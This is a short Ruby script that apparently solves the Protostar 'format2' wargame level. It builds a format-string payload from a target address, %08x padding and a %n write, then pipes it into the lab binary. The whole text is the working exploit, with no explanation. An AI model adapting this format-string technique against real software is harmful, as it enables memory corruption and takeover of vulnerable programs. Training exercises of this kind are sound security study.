#!/usr/bin/ruby

target = "\xe4\x96\x04\x08"
stdin = "XXXX" + ("%08x" * 3) + target + ("%08x" * 4) + "%n"
command = "echo #{stdin} | /opt/protostar/bin/format2"
puts `#{command}`
